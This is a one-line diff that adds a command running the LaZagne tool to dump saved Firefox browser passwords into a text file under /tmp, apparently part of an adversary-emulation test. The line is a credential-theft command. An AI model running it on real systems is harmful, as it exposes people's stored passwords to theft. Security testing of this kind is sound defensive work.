@@ -1,0 +1,1 @@
+python3 /tmp/atomic-LaZagne/laZagne.py browsers -firefox >> /tmp/atomic-firefox-password.txt
